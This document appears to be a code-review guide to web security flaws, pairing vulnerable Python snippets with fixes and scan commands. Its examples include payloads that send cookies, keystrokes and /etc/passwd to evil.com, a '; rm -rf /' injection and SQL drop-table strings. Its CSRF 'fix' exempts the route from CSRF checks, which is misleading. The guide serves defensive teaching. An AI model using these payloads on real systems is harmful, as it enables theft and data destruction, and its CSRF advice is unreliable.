# Security Vulnerabilities

**Category**: Security Analysis
**Severity**: Critical
**Priority**: Must fix before code approval

Security vulnerabilities are the highest priority in code review. A single vulnerability can compromise entire systems.

---

## SQL Injection

**Description**: Executing arbitrary SQL through unsanitized user input

**Detection**:
```python
# ❌ VULNERABLE: String interpolation
query = f"SELECT * FROM users WHERE id = {user_id}"
query = "SELECT * FROM users WHERE name = '" + username + "'"
query = "SELECT * FROM users WHERE id = %s" % user_id

# ❌ VULNERABLE: String concatenation
query = "SELECT * FROM users WHERE id = " + str(user_id)
```

**Fix**:
```python
# ✅ SAFE: Parameterized queries
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))

# ✅ SAFE: ORM (SQLAlchemy, Django ORM)
user = User.query.filter_by(id=user_id).first()
```

**Why it matters**:
Attackers can:
- Dump entire database: `1 OR 1=1`
- Delete data: `1; DROP TABLE users--`
- Bypass authentication: `admin' --`

**Verification**:
```bash
# Scan for SQL injection patterns
grep -r "execute.*f\"" src/
grep -r "execute.*%" src/
bandit -r src/ -f json | jq '.results[] | select(.issue_text | contains("SQL"))'
```

---

## Cross-Site Scripting (XSS)

**Description**: Injecting malicious scripts into web pages viewed by other users

**Detection**:
```python
# ❌ VULNERABLE: Unescaped user input in HTML
return f"<div>Welcome, {username}!</div>"

# ❌ VULNERABLE: innerHTML in JavaScript
document.getElementById('welcome').innerHTML = username;

# ❌ VULNERABLE: Jinja2 without autoescaping
return render_template_string(f"<div>{user_input}</div>")
```

**Fix**:
```python
# ✅ SAFE: Escaped output
from html import escape
return f"<div>Welcome, {escape(username)}!</div>"

# ✅ SAFE: Template autoescaping (Flask, Django)
return render_template('welcome.html', username=username)

# ✅ SAFE: textContent in JavaScript
document.getElementById('welcome').textContent = username;
```

**Why it matters**:
Attackers can:
- Steal session cookies: `<script>fetch('http://evil.com?cookie='+document.cookie)</script>`
- Redirect users: `<script>window.location='http://phishing.com'</script>`
- Keylog inputs: `<script>document.addEventListener('input', e => fetch('http://evil.com?data='+e.target.value))</script>`

**Verification**:
```bash
# Scan for XSS patterns
grep -r "innerHTML\|outerHTML" src/
grep -r "render_template_string" src/
```

---

## Cross-Site Request Forgery (CSRF)

**Description**: Tricking users into executing unwanted actions

**Detection**:
```python
# ❌ VULNERABLE: State-changing operations without CSRF protection
@app.route('/delete_account', methods=['POST'])
def delete_account():
    user_id = session['user_id']
    delete_user(user_id)
    return {'status': 'deleted'}
```

**Fix**:
```python
# ✅ SAFE: CSRF token validation (Flask-WTF)
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/delete_account', methods=['POST'])
@csrf.exempt  # Only if you have custom CSRF handling
def delete_account():
    # CSRF token automatically validated by Flask-WTF
    user_id = session['user_id']
    delete_user(user_id)
    return {'status': 'deleted'}

# ✅ SAFE: SameSite cookies
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

**Why it matters**:
Attackers can:
- Transfer money: `<img src="http://bank.com/transfer?to=attacker&amount=10000">`
- Change email: `<form action="http://site.com/change_email" method="POST"><input name="email" value="attacker@evil.com"></form>`
- Delete accounts without user consent

---

## Authentication Bypass

**Description**: Circumventing authentication mechanisms

**Detection**:
```python
# ❌ VULNERABLE: Client-side authentication
if request.headers.get('X-Is-Admin') == 'true':
    return admin_panel()

# ❌ VULNERABLE: Predictable session IDs
session_id = str(user_id)  # Attacker can guess

# ❌ VULNERABLE: No session expiration
session.permanent = True  # Never expires
```

**Fix**:
```python
# ✅ SAFE: Server-side authentication
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin')
@require_auth
def admin_panel():
    user = get_user(session['user_id'])
    if not user.is_admin:
        abort(403)
    return render_template('admin.html')

# ✅ SAFE: Cryptographically secure session IDs
app.config['SECRET_KEY'] = os.urandom(32)  # Flask generates secure IDs

# ✅ SAFE: Session expiration
from datetime import timedelta
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
```

---

## Insecure Cryptography

**Description**: Weak encryption, hashing, or key management

**Detection**:
```python
# ❌ VULNERABLE: Weak password hashing
password_hash = hashlib.md5(password.encode()).hexdigest()
password_hash = hashlib.sha1(password.encode()).hexdigest()

# ❌ VULNERABLE: No salt
password_hash = hashlib.sha256(password.encode()).hexdigest()

# ❌ VULNERABLE: Weak encryption
from Crypto.Cipher import DES
cipher = DES.new(key)  # DES is broken

# ❌ VULNERABLE: Hard-coded keys
SECRET_KEY = "mysecretkey123"
```

**Fix**:
```python
# ✅ SAFE: Strong password hashing with salt
from werkzeug.security import generate_password_hash, check_password_hash

password_hash = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)
is_valid = check_password_hash(password_hash, password)

# ✅ SAFE: bcrypt (recommended)
import bcrypt

password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
is_valid = bcrypt.checkpw(password.encode(), password_hash)

# ✅ SAFE: Strong encryption (AES)
from cryptography.fernet import Fernet

key = Fernet.generate_key()  # Store securely
cipher = Fernet(key)
encrypted = cipher.encrypt(plaintext.encode())

# ✅ SAFE: Environment variables for secrets
SECRET_KEY = os.environ['SECRET_KEY']
```

**Why it matters**:
- MD5/SHA1 can be cracked in seconds (rainbow tables, GPUs)
- Weak encryption easily broken
- Hard-coded keys exposed in version control

**Verification**:
```bash
# Check for weak hashing
grep -r "hashlib\.md5\|hashlib\.sha1" src/

# Check for hard-coded secrets
git secrets --scan
truffleHog --regex --entropy=False .
```

---

## Hard-Coded Secrets

**Description**: Credentials, API keys, or secrets in source code

**Detection**:
```python
# ❌ VULNERABLE: Hard-coded credentials
DATABASE_URL = "postgresql://admin:password123@localhost/db"
API_KEY = "sk_live_abc123def456"
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# ❌ VULNERABLE: Committed .env file
# .env in repository
```

**Fix**:
```python
# ✅ SAFE: Environment variables
import os

DATABASE_URL = os.environ.get('DATABASE_URL')
API_KEY = os.environ.get('API_KEY')
AWS_SECRET = os.environ.get('AWS_SECRET_KEY')

# ✅ SAFE: Secret management service
from boto3 import client

secrets_client = client('secretsmanager')
response = secrets_client.get_secret_value(SecretId='prod/database/password')
DATABASE_PASSWORD = response['SecretString']

# ✅ SAFE: .env excluded from version control
# .gitignore
.env
.env.local
secrets/
```

**Why it matters**:
- Secrets in git history exposed forever (even after deletion)
- GitHub secret scanning alerts attackers
- Compromised keys grant full access

**Verification**:
```bash
# Scan for secrets in code
git secrets --scan
truffleHog --regex --entropy=True .

# Check for committed .env
git log --all -- .env

# Scan for API key patterns
grep -r "api_key\|apikey\|secret_key" src/
```

---

## Authorization Bypass

**Description**: Accessing resources without proper permissions

**Detection**:
```python
# ❌ VULNERABLE: Missing permission checks
@app.route('/users/<int:user_id>/delete', methods=['POST'])
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()  # No permission check!
    return {'status': 'deleted'}

# ❌ VULNERABLE: Client-side authorization
# Trusting user-supplied role/permission claims
```

**Fix**:
```python
# ✅ SAFE: Permission checks
@app.route('/users/<int:user_id>/delete', methods=['POST'])
def delete_user(user_id):
    current_user = get_current_user()

    # Check ownership OR admin role
    if current_user.id != user_id and not current_user.is_admin:
        abort(403, "Permission denied")

    User.query.filter_by(id=user_id).delete()
    return {'status': 'deleted'}

# ✅ SAFE: Decorator-based authorization
from functools import wraps

def require_permission(permission):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            user = get_current_user()
            if not user.has_permission(permission):
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/admin/settings')
@require_permission('admin')
def admin_settings():
    return render_template('admin_settings.html')
```

**Why it matters**:
- Users can access/modify others' data
- Privilege escalation (regular user → admin)
- Data breaches, unauthorized modifications

---

## Path Traversal

**Description**: Accessing files outside intended directory

**Detection**:
```python
# ❌ VULNERABLE: Unsanitized file paths
@app.route('/download/<path:filename>')
def download_file(filename):
    return send_file(f"/uploads/{filename}")  # Can access ../../../etc/passwd
```

**Fix**:
```python
# ✅ SAFE: Validate and sanitize paths
import os
from werkzeug.utils import secure_filename

@app.route('/download/<path:filename>')
def download_file(filename):
    # Sanitize filename
    safe_filename = secure_filename(filename)

    # Ensure path stays within uploads directory
    file_path = os.path.join('/uploads', safe_filename)
    if not os.path.abspath(file_path).startswith('/uploads'):
        abort(400, "Invalid file path")

    if not os.path.exists(file_path):
        abort(404)

    return send_file(file_path)
```

**Why it matters**:
Attackers can:
- Read sensitive files: `../../../etc/passwd`, `../../.env`
- Access source code
- Overwrite critical files

---

## Command Injection

**Description**: Executing arbitrary system commands

**Detection**:
```python
# ❌ VULNERABLE: Unsanitized input to shell
import os
filename = request.args.get('file')
os.system(f"cat {filename}")  # Can execute: `; rm -rf /`

# ❌ VULNERABLE: Shell=True with user input
import subprocess
subprocess.run(f"ping {host}", shell=True)
```

**Fix**:
```python
# ✅ SAFE: Avoid shell, use list arguments
import subprocess
filename = request.args.get('file')
subprocess.run(['cat', filename])  # Arguments properly escaped

# ✅ SAFE: Input validation (allowlist)
import re
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    abort(400, "Invalid filename")
subprocess.run(['cat', filename])

# ✅ SAFE: Use libraries instead of shell commands
# Instead of `cat file`, use Python's open()
with open(filename, 'r') as f:
    content = f.read()
```

**Why it matters**:
Attackers can:
- Execute arbitrary commands: `; rm -rf /`
- Steal data: `; curl http://evil.com/$(cat /etc/passwd)`
- Install backdoors

---

## Security Checklist

Before approving code:

- [ ] **SQL Injection**: Parameterized queries, ORM usage
- [ ] **XSS**: Escaped output, no innerHTML with user data
- [ ] **CSRF**: CSRF tokens, SameSite cookies
- [ ] **Authentication**: Server-side checks, secure session IDs, expiration
- [ ] **Cryptography**: Strong hashing (bcrypt, Argon2), AES encryption, no hard-coded keys
- [ ] **Secrets**: Environment variables, secret managers, no commits
- [ ] **Authorization**: Permission checks, no client-side trust
- [ ] **Path Traversal**: Sanitized paths, allowlist validation
- [ ] **Command Injection**: No shell=True, input validation

**If any unchecked, code has critical security issues.**

---

## OWASP Top 10 Reference

1. **Injection** (SQL, NoSQL, OS command, LDAP)
2. **Broken Authentication** (weak passwords, session management)
3. **Sensitive Data Exposure** (unencrypted data, weak crypto)
4. **XML External Entities (XXE)** (XML parser attacks)
5. **Broken Access Control** (missing authorization checks)
6. **Security Misconfiguration** (default configs, verbose errors)
7. **Cross-Site Scripting (XSS)** (reflected, stored, DOM-based)
8. **Insecure Deserialization** (pickle, YAML, JSON attacks)
9. **Using Components with Known Vulnerabilities** (outdated dependencies)
10. **Insufficient Logging & Monitoring** (no audit trails, no alerts)

**Full OWASP guide**: security/owasp-checklist.md

---

## Summary

**Security vulnerabilities prioritized**:
- SQL Injection → Parameterized queries
- XSS → Escaped output
- CSRF → CSRF tokens
- Authentication Bypass → Server-side checks
- Insecure Cryptography → bcrypt, AES, no hard-coded keys
- Hard-Coded Secrets → Environment variables
- Authorization Bypass → Permission checks
- Path Traversal → Sanitized paths
- Command Injection → No shell=True

**All critical issues must be fixed before code approval.**

**Security is not negotiable.**
